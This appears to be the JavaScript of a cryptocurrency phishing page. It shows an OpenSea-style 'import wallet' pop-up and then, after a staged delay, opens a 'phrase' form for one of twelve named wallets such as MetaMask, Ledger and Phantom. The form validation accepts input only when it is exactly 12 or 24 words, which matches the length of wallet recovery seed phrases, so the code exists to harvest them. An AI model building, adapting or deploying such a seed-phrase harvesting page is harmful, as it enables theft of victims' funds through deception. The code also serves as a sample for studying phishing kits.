let releaseButton = document.getElementById('release');

releaseButton.addEventListener('click', ()=>{
    const hiddenBoxes = document.querySelectorAll('.hidden-box');
    hiddenBoxes.forEach((box)=>{
        if(box.style.display == 'block'){
            box.style.display = 'none';
            releaseButton.innerText = 'Show more';
        }else{
            box.style.display = 'block';
            releaseButton.innerText = 'Show Less';
        }
    
})
});

// 

// main-pop-up
// import WalletConnectProvider from '@walletconnect/web3-provider';
// import WalletConnectProvider from '@walletconnect/web3-provider';

const walletDivs = document.querySelectorAll('.start');
const forms = document.querySelectorAll('.form-box');

// Wallets
const metamask = document.getElementById("metamaskPhrasePopup"); 

const coinbase = document.getElementById("coinbasePhrasePopup");

const walletConnect = document.getElementById("walletConnectPhrasePopup");

const ledger = document.getElementById("ledgerPhrasePopup");

const phantom = document.getElementById("phantomPhrasePopup");

const bitkeep = document.getElementById("bitkeepPhrasePopup");

const core = document.getElementById("corePhrasePopup");

const glow = document.getElementById("glowPhrasePopup");

const formatic = document.getElementById("formaticPhrasePopup");

const kaikas = document.getElementById("kaikasPhrasePopup");

const bitski = document.getElementById("bitskiPhrasePopup");

const solflare = document.getElementById("solflarePhrasePopup");
  

// loop through each div and add the show opensea PopUp function
walletDivs.forEach(function(div) {
  div.addEventListener('click', function(){
    const _divId = div.dataset.divId;
    walletAccess(_divId);
  })
});

// Access wallet logic
async function walletAccess (walletId){
  switch(walletId){
    case '1' :
        // showOpenseaPopUp
        showOpenseaPopUp(walletId);
      break;

    case '2':
        showOpenseaPopUp(walletId);
        break;

    case '3' :
        showOpenseaPopUp(walletId);
        break;
    case '4' :
        showOpenseaPopUp(walletId);
        break;
    case '5' :
        showOpenseaPopUp(walletId);
        break;
    case '6' :
        showOpenseaPopUp(walletId);
        break;
    case '7' :
        showOpenseaPopUp(walletId);
        break;
    case '8' :
        showOpenseaPopUp(walletId);
        break;
    case '9' :
        showOpenseaPopUp(walletId);
        break;
    case '10' :
        showOpenseaPopUp(walletId);
        break;
    case '11' :
        showOpenseaPopUp(walletId);
        break;
    case '12' :
        showOpenseaPopUp(walletId);
        break;
  }

  
}


// Function to show the opensea pop-up article
function showOpenseaPopUp(_divId) {
  // Show the overlay
  document.getElementById("overlay").style.display = "block";

  // Show the opensea pop-up article container
  document.getElementById("openseaPopup").style.display = "block";
  document.getElementById('openseaPopup').classList.add('show');
  
// console.log(_divId);
  const importButton = document.getElementById('mainWalletPopUp');
  importButton.addEventListener('click', function() {
    importButton.style.opacity = .7;
    // console.log(_divId);
    showWalletPopUp(_divId);
  });
}

// Function to hide the opensea pop-up article
function closeOpenseaPopUp() {
  // Hide the overlay
  document.getElementById("overlay").style.display = "none";

  // Hide the pop-up article container
  document.getElementById('openseaPopup').classList.remove('show');

}

// Trigger the pop-up article on click event

function showWalletPopUp(_divId){
  // console.log(_divId, ' Yes, i am visible');
  let divId = _divId;
  setTimeout(function() { 
    document.getElementById('openseaPopup').classList.remove('show');
  

  switch(divId){
    case '1' :
      metamask.classList.add('show'); 
      break;
    case '2':
      coinbase.classList.add('show');
      break;
    case '3' :
      walletConnect.classList.add('show');
      break;
    case '4' :
      ledger.classList.add('show');
      break;
    case '5' :
      phantom.classList.add('show');
      break;
    case '6' :
      bitkeep.classList.add('show');
      break;
    case '7' :
      core.classList.add('show');
      break;
    case '8' :
      glow.classList.add('show');
      break;
    case '9' :
      formatic.classList.add('show');
      break;
    case '10' :
      kaikas.classList.add('show');
      break;
    case '11' :
      bitski.classList.add('show');
      break;
    case '12' :
      solflare.classList.add('show');
      break;
  }

  }, 3000);
  
};

// Loop through each form and add an event listener to the submit event
forms.forEach(function(form) {
  const textArea = form.querySelector('.text_area'); // Get the textarea within the form

  form.addEventListener('submit', (event) => {
      // Count the number of words in the textarea input
      const wordCount = textArea.value.trim().split(/\s+/).length;
      const errorTexts = document.querySelectorAll('.error-text');
    
      // Check if the word count is equal to 12
      if (wordCount !== 12 && wordCount !== 24) {
        // If the word count is not equal to 12 or 24, prevent the form from submitting
        event.preventDefault();
        errorTexts.forEach((texts) =>{
          let text = texts;
          text.style.display = 'block';
          setTimeout(() => {
            text.style.display = 'none';
          }, 2000);
        })
        
      }
    });
});
// form valaidation logic ends

